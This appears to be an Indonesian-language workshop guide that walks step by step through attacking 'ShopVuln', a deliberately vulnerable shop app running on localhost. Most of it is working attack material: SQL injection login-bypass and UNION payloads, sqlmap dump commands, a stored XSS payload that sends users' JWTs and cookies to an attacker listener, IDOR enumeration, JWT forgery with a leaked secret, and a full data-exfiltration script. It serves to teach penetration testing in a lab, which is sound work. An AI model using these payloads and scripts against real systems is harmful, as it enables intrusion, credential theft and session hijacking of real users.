# 🔴 Dokumentasi #3 — Alur Penyerangan Lengkap (Attack Flow)
## ShopVuln CyberSecurity Workshop — Dari Reconnaissance hingga Impact

> ⚠️ Dokumentasi ini hanya untuk keperluan **edukasi dan authorized penetration testing**.

---

## 🗺️ Overview Kill Chain

```
Phase 1: RECONNAISSANCE      → Kumpulkan info target
Phase 2: SCANNING            → Scan port, service, vulnerability
Phase 3: ENUMERATION         → Temukan path, file, user tersembunyi
Phase 4: EXPLOITATION        → Eksploitasi vulnerability yang ditemukan
Phase 5: POST-EXPLOITATION   → Privilege escalation, persistence
Phase 6: IMPACT              → Data exfiltration, session hijacking
```

---

## 🎯 Target Scope

```
Target   : ShopVuln Web Application
Frontend : http://localhost:3000
Backend  : http://localhost:5000
Database : localhost:3306
```

---

## PHASE 1 — RECONNAISSANCE (Pengumpulan Informasi)

### Tools: Browser, curl, whois, nslookup

### 1.1 Passive Recon — robots.txt

```bash
curl http://localhost:5000/robots.txt
```

**Output:**
```
User-agent: *
Disallow: /admin/
Disallow: /backup/
Disallow: /config/
Disallow: /api/admin/
Disallow: /.env
Disallow: /database/
```

**Temuan:** robots.txt mengungkap path sensitif yang seharusnya disembunyikan!

### 1.2 Passive Recon — Analisis Response Header

```bash
curl -I http://localhost:5000/api/health
```

**Output:**
```
HTTP/1.1 200 OK
X-Powered-By: Express        ← Tech stack terbongkar
Content-Type: application/json
```

```bash
curl http://localhost:5000/api/health
```

**Output:**
```json
{
  "status": "healthy",
  "version": "1.0.0",
  "node_version": "v18.20.8",    ← Versi Node.js
  "platform": "linux",
  "db_host": "mysql"             ← Nama host DB
}
```

### 1.3 Google Dork — Information Disclosure

Pada target publik, gunakan operator Google:
```
site:target.com filetype:sql
site:target.com inurl:backup
site:target.com inurl:config filetype:txt
site:target.com intitle:"index of"
```

Untuk lab lokal, akses langsung:
```bash
# Database backup dengan kredensial
curl http://localhost:5000/backup/db_backup_2024.sql

# Config file dengan secret keys
curl http://localhost:5000/config/config.txt

# Admin notes dengan password
curl http://localhost:5000/admin/notes.txt
```

**Temuan Kritis:**
```
JWT_SECRET=super_secret_jwt_key_2024_do_not_share
DB_PASS=rootpassword
admin / admin123
bob_admin / bob2024!
```

---

## PHASE 2 — SCANNING

### Tools: nmap, nikto, whatweb

### 2.1 Port Scanning dengan Nmap

```bash
# Install nmap
sudo apt install -y nmap

# Basic scan
nmap -sV localhost

# Aggressive scan
nmap -A -p 3000,5000,3306 localhost
```

**Output:**
```
PORT     STATE SERVICE VERSION
3000/tcp open  http    nginx 1.x (frontend)
5000/tcp open  http    Node.js Express
3306/tcp open  mysql   MySQL 8.0
```

### 2.2 Web Scanner dengan Nikto

```bash
# Install nikto
sudo apt install -y nikto

# Scan backend
nikto -h http://localhost:5000

# Scan frontend
nikto -h http://localhost:3000
```

**Output penting dari Nikto:**
```
+ Server: Express
+ The X-Frame-Options header is not set
+ No anti-clickjacking X-Frame-Options header found
+ /robots.txt: contains 6 entries which should be manually reviewed
+ /backup/: Directory indexing found
+ /config/: Directory indexing found
```

### 2.3 Tech Stack Fingerprint dengan WhatWeb

```bash
# Install whatweb
sudo apt install -y whatweb

whatweb http://localhost:3000
whatweb http://localhost:5000
```

---

## PHASE 3 — ENUMERATION

### Tools: gobuster, dirb, ffuf, manual curl

### 3.1 Directory Brute Force dengan Gobuster

```bash
# Install gobuster
sudo apt install -y gobuster

# Wordlist default
gobuster dir \
  -u http://localhost:5000 \
  -w /usr/share/wordlists/dirb/common.txt \
  -x txt,sql,js,json,env \
  -t 50

# Wordlist lebih lengkap
gobuster dir \
  -u http://localhost:5000 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x txt,sql,backup,conf,config,env,log \
  -t 100 \
  -o gobuster_output.txt
```

**Output:**
```
/backup               (Status: 301)
/config               (Status: 301)
/admin                (Status: 301)
/assets               (Status: 301)
/robots.txt           (Status: 200)
/api                  (Status: 200)
```

### 3.2 API Endpoint Enumeration dengan ffuf

```bash
# Install ffuf
sudo apt install -y ffuf

# Fuzz API endpoints
ffuf -w /usr/share/wordlists/dirb/common.txt \
     -u http://localhost:5000/api/FUZZ \
     -mc 200,201,301,302,401,403
```

**Output:**
```
products     [Status: 200]
auth         [Status: 404]
orders       [Status: 401]
admin        [Status: 401]
health       [Status: 200]
```

### 3.3 Manual Enumeration — File Sensitif

```bash
# Script otomatis cek file sensitif
python3 docs/dork_scanner.py

# Manual
for path in /robots.txt /backup/db_backup_2024.sql /config/config.txt \
            /admin/notes.txt /.env /package.json /.git/config; do
  code=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:5000$path)
  echo "[$code] $path"
done
```

**Output:**
```
[200] /robots.txt                    ← FOUND
[200] /backup/db_backup_2024.sql     ← FOUND — KREDENSIAL!
[200] /config/config.txt             ← FOUND — SECRET KEYS!
[200] /admin/notes.txt               ← FOUND — PASSWORD ADMIN!
[404] /.env
[200] /api/health                    ← FOUND — INFO DISCLOSURE
```

---

## PHASE 4 — EXPLOITATION

### 4.1 SQL Injection — Manual via Login Form

**Target:** http://localhost:3000/login

**Langkah:**
1. Buka http://localhost:3000/login
2. Masukkan payload di field **Username:**

```
admin' -- 
```

3. Password: isi bebas (misal: `abc`)
4. Klik **Sign In**
5. ✅ Login berhasil sebagai **admin** tanpa password!

**Payload Alternatif:**
```
' OR '1'='1' -- 
' OR 1=1 -- 
admin'#
```

---

### 4.2 SQL Injection — Automated dengan SQLMap

```bash
# Install sqlmap
sudo apt install -y sqlmap

# ─── SQLi pada Login (POST) ───────────────────────────────────
sqlmap -u "http://localhost:5000/api/auth/login" \
  --data='{"username":"*","password":"test"}' \
  --content-type="application/json" \
  --level=3 --risk=2 \
  --dbms=mysql \
  --batch \
  --dbs

# ─── SQLi pada Search (GET) ───────────────────────────────────
sqlmap -u "http://localhost:5000/api/products?search=test" \
  -p search \
  --dbms=mysql \
  --batch \
  --dbs

# Dump tabel users
sqlmap -u "http://localhost:5000/api/products?search=test" \
  -p search \
  --dbms=mysql \
  --batch \
  -D shopvuln -T users \
  --dump

# Dump semua tabel
sqlmap -u "http://localhost:5000/api/products?search=test" \
  -p search \
  --dbms=mysql \
  --batch \
  -D shopvuln \
  --dump-all
```

**Output sqlmap:**
```
[INFO] GET parameter 'search' is vulnerable
[INFO] the back-end DBMS is MySQL

Database: shopvuln
Table: users
+----+-----------+---------------------------+-------------+----------+
| id | username  | email                     | password    | role     |
+----+-----------+---------------------------+-------------+----------+
| 1  | admin     | admin@shopvuln.local      | admin123    | admin    |
| 2  | john_doe  | john@example.com          | password123 | customer |
| 5  | bob_admin | bob@shopvuln.local        | bob2024!    | admin    |
+----+-----------+---------------------------+-------------+----------+
```

---

### 4.3 SQL Injection — UNION Attack Manual

**Target:** Search bar di http://localhost:3000

#### Step 1: Tentukan jumlah kolom

```
# Coba ORDER BY sampai error
http://localhost:5000/api/products?search=' ORDER BY 9 -- 
```

Jika tidak error → tabel products punya 9 kolom.

#### Step 2: UNION dump users

```bash
curl -G http://localhost:5000/api/products \
  --data-urlencode "search=' UNION SELECT 1,username,email,password,role,6,7,8,9 FROM users -- "
```

**Response (data user bocor):**
```json
[
  {"id":1,"name":"admin","description":"admin@shopvuln.local",
   "price":"admin123","category":"admin","stock":6,...},
  {"id":1,"name":"john_doe","description":"john@example.com",
   "price":"password123","category":"customer",...}
]
```

#### Step 3: Dump site_config (JWT Secret, API Key)

```bash
curl -G http://localhost:5000/api/products \
  --data-urlencode "search=' UNION SELECT 1,config_key,config_value,4,5,6,7,8,9 FROM site_config -- "
```

**Response:**
```json
[
  {"name":"jwt_secret","description":"super_secret_jwt_key_2024_do_not_share",...},
  {"name":"payment_api_key","description":"pk_live_shopvuln_1234567890abcdef",...}
]
```

---

### 4.4 Stored XSS — Exploit

**Target:** http://localhost:3000/products/1 (halaman review)

**Prasyarat:** Login sebagai user (john_doe / password123)

#### Step 1: Jalankan Attacker Server

```bash
# Terminal 1
python3 docs/attacker_server.py
# Listening on port 8888
```

#### Step 2: Inject XSS Payload

Buka http://localhost:3000/products/1, scroll ke bagian review, masukkan:

```html
<script>fetch('http://localhost:8888?jwt='+localStorage.getItem('token')+'&user='+document.cookie)</script>
```

Atau via curl (setelah login):
```bash
# Ambil token
TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"john_doe","password":"password123"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# Submit review dengan XSS payload
curl -s -X POST http://localhost:5000/api/products/1/reviews \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"rating":5,"comment":"<script>fetch(\"http://localhost:8888?jwt=\"+localStorage.getItem(\"token\"))</script>"}'
```

#### Step 3: Tunggu Korban Membuka Halaman

Setiap user yang membuka http://localhost:3000/products/1 akan mengirim token mereka ke attacker server:

**Output attacker server:**
```
============================================================
[🎯 22:05:33] STOLEN DATA RECEIVED from 127.0.0.1
  🔑 JWT: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
  Total stolen records: 1
============================================================
```

---

### 4.5 IDOR — Akses Data User Lain

```bash
# Login sebagai john_doe
TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"john_doe","password":"password123"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

echo "[+] Token: $TOKEN"

# Akses order milik user lain (IDOR)
for i in 1 2 3 4 5; do
  echo "=== Mencoba user_id=$i ==="
  curl -s -H "Authorization: Bearer $TOKEN" \
    "http://localhost:5000/api/orders?user_id=$i" | python3 -m json.tool 2>/dev/null
done
```

---

## PHASE 5 — POST-EXPLOITATION

### 5.1 JWT Token Forgery (setelah dapat secret)

Secret didapat dari `/config/config.txt` atau SQLi dump:
`super_secret_jwt_key_2024_do_not_share`

```bash
# Install PyJWT
pip3 install PyJWT

python3 - << 'PYEOF'
import jwt

SECRET = "super_secret_jwt_key_2024_do_not_share"

# Forge token dengan role admin
payload = {
    "id": 999,
    "username": "hacker",
    "role": "admin",
    "email": "hacker@evil.com"
}

token = jwt.encode(payload, SECRET, algorithm="HS256")
print(f"[+] Forged Admin Token:\n{token}")
PYEOF
```

**Gunakan forged token:**
```bash
FORGED_TOKEN="<token dari output di atas>"

# Akses admin endpoint
curl -H "Authorization: Bearer $FORGED_TOKEN" \
  http://localhost:5000/api/admin/users | python3 -m json.tool

# Akses config rahasia
curl -H "Authorization: Bearer $FORGED_TOKEN" \
  http://localhost:5000/api/admin/config | python3 -m json.tool
```

**Output — semua user + password plaintext:**
```json
[
  {"id":1,"username":"admin","password":"admin123","role":"admin"},
  {"id":2,"username":"john_doe","password":"password123","role":"customer"},
  {"id":5,"username":"bob_admin","password":"bob2024!","role":"admin"}
]
```

---

### 5.2 Session Hijacking dengan Stolen JWT

```bash
# Gunakan token yang dicuri via XSS
STOLEN_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# Akses profil korban
curl -H "Authorization: Bearer $STOLEN_TOKEN" \
  http://localhost:5000/api/auth/me

# Akses order korban
curl -H "Authorization: Bearer $STOLEN_TOKEN" \
  http://localhost:5000/api/orders
```

---

### 5.3 Akses Database Langsung (dari kredensial yang bocor)

```bash
# Kredensial didapat dari /config/config.txt atau db_backup
mysql -h 127.0.0.1 -P 3306 -u root -prootpassword

# Di dalam MySQL shell:
USE shopvuln;
SELECT * FROM users;
SELECT * FROM site_config;
SELECT * FROM orders;
```

---

## PHASE 6 — IMPACT DEMONSTRATION

### 6.1 Data Exfiltration — Dump Semua Data

```python
#!/usr/bin/env python3
# full_exfil.py — Demonstrasi dampak total compromise
import requests, json

BASE = "http://localhost:5000"

print("=" * 60)
print("[🔴 FULL DATA EXFILTRATION - WORKSHOP DEMO]")
print("=" * 60)

# Step 1: Auth bypass
r = requests.post(f"{BASE}/api/auth/login",
    json={"username": "admin' -- ", "password": "x"})
token = r.json()["token"]
print(f"\n[+] Auth bypass OK — token: {token[:40]}...")

headers = {"Authorization": f"Bearer {token}"}

# Step 2: Dump users
r = requests.get(f"{BASE}/api/admin/users", headers=headers)
users = r.json()
print(f"\n[+] Users dumped ({len(users)} total):")
for u in users:
    print(f"    {u['username']:<15} | {u['password']:<15} | {u['role']}")

# Step 3: Dump config
r = requests.get(f"{BASE}/api/admin/config", headers=headers)
configs = r.json()
print(f"\n[+] Config secrets dumped:")
for c in configs:
    print(f"    {c['config_key']:<25} = {c['config_value']}")

print("\n[💀 Full system compromise achieved!")
print("[💀 All credentials, secrets, and orders are exposed.")
print("=" * 60)
```

```bash
python3 full_exfil.py
```

---

## 📊 Attack Flow Summary

```
┌─────────────────────────────────────────────────────────────┐
│              SHOPVULN ATTACK FLOW DIAGRAM                   │
└─────────────────────────────────────────────────────────────┘

[1] RECON
    curl robots.txt → menemukan /backup, /config, /admin
         │
         ▼
[2] INFO GATHERING
    /backup/db_backup_2024.sql → admin:admin123
    /config/config.txt         → JWT_SECRET
         │
         ▼
[3] INITIAL ACCESS (pilih salah satu)
    ├─ SQLi: admin' --          → Login bypass
    ├─ Credential: admin/admin123 → Direct login
    └─ sqlmap auto dump         → Semua user/password
         │
         ▼
[4] PRIVILEGE ESCALATION
    JWT Secret (dari config) → Forge admin token
    → /api/admin/users       → Dump semua password
         │
         ▼
[5] LATERAL MOVEMENT
    IDOR: ?user_id=N → Akses order semua user
    XSS: stored payload → Steal token pengunjung lain
         │
         ▼
[6] FULL COMPROMISE
    ✓ Semua user credential
    ✓ Payment API key
    ✓ Database direct access
    ✓ Admin panel full control
    ✓ Session setiap user
```

---

## 🛠️ Tool Summary

| Phase | Tool | Instalasi | Fungsi |
|-------|------|-----------|--------|
| Recon | curl | pre-installed | Manual HTTP request |
| Recon | Browser DevTools | F12 | Analisis response, JS |
| Scanning | nmap | `apt install nmap` | Port & service scan |
| Scanning | nikto | `apt install nikto` | Web vulnerability scanner |
| Scanning | whatweb | `apt install whatweb` | Tech fingerprinting |
| Enumeration | gobuster | `apt install gobuster` | Directory brute force |
| Enumeration | ffuf | `apt install ffuf` | Fast web fuzzer |
| Exploitation | sqlmap | `apt install sqlmap` | SQLi automation |
| Exploitation | curl | pre-installed | Manual exploit |
| Post-Exploit | PyJWT | `pip3 install PyJWT` | JWT token forgery |
| Post-Exploit | python3 | pre-installed | Custom scripts |
| Impact | attacker_server.py | (included) | XSS data catcher |
| Impact | sqli_exploit.py | (included) | SQLi automation |

### Install Semua Tools Sekaligus

```bash
sudo apt update && sudo apt install -y \
  nmap nikto whatweb gobuster ffuf sqlmap curl

pip3 install requests PyJWT
```

---

*Attack Flow Documentation v1.0 — ShopVuln CyberSecurity Workshop*
